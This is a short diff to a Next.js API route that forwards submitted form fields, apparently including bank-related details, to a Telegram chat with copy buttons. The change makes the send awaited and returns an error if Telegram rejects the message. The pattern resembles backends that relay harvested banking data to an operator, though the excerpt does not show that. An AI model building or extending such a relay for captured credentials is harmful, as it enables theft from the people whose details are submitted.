@@ -1,4 +1,4 @@
-import { NextResponse, after } from 'next/server'
+import { NextResponse } from 'next/server'
 import { buildCopyKeyboard, sendTelegramMessage } from '@/lib/telegram-server'
 
 // Fields whose value is just context (which bank) rather than a detail an
@@ -60,12 +60,10 @@ export async function POST(request: Request) {
       .map((f) => ({ text: `✅ Copy ${f.label}`, value: f.value }))
     const replyMarkup = copyButtons.length > 0 ? buildCopyKeyboard(copyButtons) : undefined
 
-    after(async () => {
-      const sent = await sendTelegramMessage(token, chatId, text, 'HTML', replyMarkup)
-      if (!sent) {
-        console.log('[v0] Telegram notify: failed after all retries')
-      }
-    })
+    const sent = await sendTelegramMessage(token, chatId, text, 'HTML', replyMarkup)
+    if (!sent) {
+      return NextResponse.json({ error: 'Telegram rejected the message' }, { status: 502 })
+    }
 
     return NextResponse.json({ ok: true })
   } catch {
